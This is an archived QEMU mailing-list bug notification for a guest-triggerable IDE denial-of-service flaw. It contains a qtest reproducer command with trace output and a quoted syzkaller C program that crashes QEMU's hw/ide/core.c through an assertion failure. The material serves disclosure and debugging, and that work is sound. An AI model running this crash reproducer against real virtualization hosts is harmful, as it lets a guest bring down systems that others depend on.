Return-Path: <SRS0=vx8y=AW=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-3.8 required=3.0 tests=BAYES_00,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,SPF_HELO_NONE,SPF_PASS
	autolearn=no autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 8BF35C433E1
	for <qemu-devel@archiver.kernel.org>; Sat, 11 Jul 2020 19:16:28 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 5CC3020725
	for <qemu-devel@archiver.kernel.org>; Sat, 11 Jul 2020 19:16:28 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 5CC3020725
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=bugs.launchpad.net
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:48886 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1juKz5-0005Vx-MU
	for qemu-devel@archiver.kernel.org; Sat, 11 Jul 2020 15:16:27 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10]:54560)
 by lists.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <bounces@canonical.com>)
 id 1juKyK-00055P-TH
 for qemu-devel@nongnu.org; Sat, 11 Jul 2020 15:15:40 -0400
Received: from indium.canonical.com ([91.189.90.7]:35510)
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_128_GCM_SHA256:128)
 (Exim 4.90_1) (envelope-from <bounces@canonical.com>)
 id 1juKyI-00049s-Jv
 for qemu-devel@nongnu.org; Sat, 11 Jul 2020 15:15:40 -0400
Received: from loganberry.canonical.com ([91.189.90.37])
 by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
 id 1juKyF-00075c-U2
 for <qemu-devel@nongnu.org>; Sat, 11 Jul 2020 19:15:35 +0000
Received: from loganberry.canonical.com (localhost [127.0.0.1])
 by loganberry.canonical.com (Postfix) with ESMTP id DC4E32E80E7
 for <qemu-devel@nongnu.org>; Sat, 11 Jul 2020 19:15:35 +0000 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Date: Sat, 11 Jul 2020 19:08:31 -0000
From: Alexander Bulekov <1777315@bugs.launchpad.net>
To: qemu-devel@nongnu.org
X-Launchpad-Notification-Type: bug
X-Launchpad-Bug: product=qemu; status=In Progress; importance=Undecided;
 assignee=jsnow@redhat.com; 
X-Launchpad-Bug-Information-Type: Public Security
X-Launchpad-Bug-Private: no
X-Launchpad-Bug-Security-Vulnerability: yes
X-Launchpad-Bug-Commenters: a1xndr asurati icytxw melver th-huth
X-Launchpad-Bug-Reporter: icytxw (icytxw)
X-Launchpad-Bug-Modifier: Alexander Bulekov (a1xndr)
References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
Message-Id: <159449451227.19199.3202756223481524119.malone@chaenomeles.canonical.com>
Subject: [Bug 1777315] Re: Denial of service
X-Launchpad-Message-Rationale: Subscriber (QEMU) @qemu-devel-ml
X-Launchpad-Message-For: qemu-devel-ml
Precedence: bulk
X-Generated-By: Launchpad (canonical.com);
 Revision="4809fcb62f445aaa3ae919f7f6c3cc7d156ea57a";
 Instance="production-secrets-lazr.conf"
X-Launchpad-Hash: f98659563f1597aad6c382a6f9cc43595413c578
Received-SPF: none client-ip=91.189.90.7; envelope-from=bounces@canonical.com;
 helo=indium.canonical.com
X-detected-operating-system: by eggs.gnu.org: First seen = 2020/07/11 14:40:54
X-ACL-Warn: Detected OS   = Linux 3.11 and newer [fuzzy]
X-Spam_score_int: -58
X-Spam_score: -5.9
X-Spam_bar: -----
X-Spam_report: (-5.9 / 5.0 requ) BAYES_00=-1.9, HEADER_FROM_DIFFERENT_DOMAINS=1,
 RCVD_IN_DNSWL_HI=-5, RCVD_IN_MSPIKE_H3=-0.01, RCVD_IN_MSPIKE_WL=-0.01,
 SPF_HELO_NONE=0.001, SPF_NONE=0.001 autolearn=ham autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

Here's a qtest reproducer:

./i386-softmmu/qemu-system-i386 -M pc,accel=3Dqtest \
-qtest null -nographic -vga qxl -qtest stdio \
-drive if=3Dnone,id=3Ddrive0,file=3Dnull-co://,file.read-zeroes=3Don,format=
=3Draw \
-drive if=3Dnone,id=3Ddrive1,file=3Dnull-co://,file.read-zeroes=3Don,format=
=3Draw \
-device ide-cd,drive=3Ddrive0 -device ide-hd,drive=3Ddrive1 -nodefaults \
< attachment

With -trace ide*:

[R +0.020410] outw 0x171 0xffff
28186@1594494474.407743:ide_ioport_write IDE PIO wr @ 0x171 (Features); val=
 0xff; bus 0x55e383419100 IDEState 0x55e383419188
28186@1594494474.407747:ide_ioport_write IDE PIO wr @ 0x172 (Sector Count);=
 val 0xff; bus 0x55e383419100 IDEState 0x55e383419188
OK
[S +0.020428] OK
[R +0.020433] outw 0x176 0x35fb
28186@1594494474.407756:ide_ioport_write IDE PIO wr @ 0x176 (Device/Head); =
val 0xfb; bus 0x55e383419100 IDEState 0x55e383419188
28186@1594494474.407757:ide_ioport_write IDE PIO wr @ 0x177 (Command); val =
0x35; bus 0x55e383419100 IDEState 0x55e383419558
28186@1594494474.407759:ide_exec_cmd IDE exec cmd: bus 0x55e383419100; stat=
e 0x55e383419558; cmd 0x35
....
28186@1594494474.411019:ide_dma_cb IDEState 0x55e383419558; sector_num=3D1 =
n=3D511 cmd=3DDMA WRITE
OK
[S +0.023732] OK
[R +0.023736] outb 0x376 0x8f
28186@1594494474.411060:ide_cmd_write IDE PIO wr @ 0x376 (Device Control); =
val 0x8f; bus 0x55e383419100
OK
[S +0.023741] OK
[R +0.023742] outw 0x376 0x2779
28186@1594494474.411064:ide_cmd_write IDE PIO wr @ 0x376 (Device Control); =
val 0x79; bus 0x55e383419100
OK
[S +0.023745] OK
qemu-system-i386: /home/alxndr/Development/qemu/hw/ide/core.c:880: void ide=
_dma_cb(void *, int): Assertion `n * 512 =3D=3D s->sg.size' failed.


** Attachment added: "attachment"
   https://bugs.launchpad.net/qemu/+bug/1777315/+attachment/5391760/+files/=
attachment

-- =

You received this bug notification because you are a member of qemu-
devel-ml, which is subscribed to QEMU.
https://bugs.launchpad.net/bugs/1777315

Title:
  Denial of service

Status in QEMU:
  In Progress

Bug description:
  Hi,
  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
2.12.0

  run the program in qemu-2.12.0:
  #define _GNU_SOURCE =

  #include <endian.h>
  #include <sys/syscall.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/stat.h>
  #include <stdint.h>
  #include <string.h>

  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
  {
          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
                  char buf[128];
                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
lock", (uint8_t)a1, (uint8_t)a2);
                  return open(buf, O_RDWR, 0);
          } else {
                  char buf[1024];
                  char* hash;
  strncpy(buf, (char*)a0, sizeof(buf) - 1);
                  buf[sizeof(buf) - 1] =3D 0;
                  while ((hash =3D strchr(buf, '#'))) {
                          *hash =3D '0' + (char)(a1 % 10);
                          a1 /=3D 10;
                  }
                  return open(buf, a2, 0);
          }
  }

  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
  void loop()
  {
          long res =3D 0;
  memcpy((void*)0x20000000, "/dev/sg#", 9);
          res =3D syz_open_dev(0x20000000, 0, 2);
          if (res !=3D -1)
                  r[0] =3D res;
          res =3D syscall(__NR_dup2, r[0], r[0]);
          if (res !=3D -1)
                  r[1] =3D res;
  *(uint8_t*)0x20000ec0 =3D 0;
  *(uint8_t*)0x20000ec1 =3D 0;
  *(uint8_t*)0x20000ec2 =3D 0;
  *(uint8_t*)0x20000ec3 =3D 0;
  *(uint32_t*)0x20000ec8 =3D 0;
  *(uint8_t*)0x20000ed8 =3D 0;
  *(uint8_t*)0x20000ed9 =3D 0;
  *(uint8_t*)0x20000eda =3D 0;
  *(uint8_t*)0x20000edb =3D 0;
  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
b3", 12);
          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
  }

  int main()
  {
          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
          loop();
          return 0;
  }
  this will crash qemu, output information:
   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
=3D=3D s->sg.size' failed.

  =

  Thanks =

  owl337

To manage notifications about this bug go to:
https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions

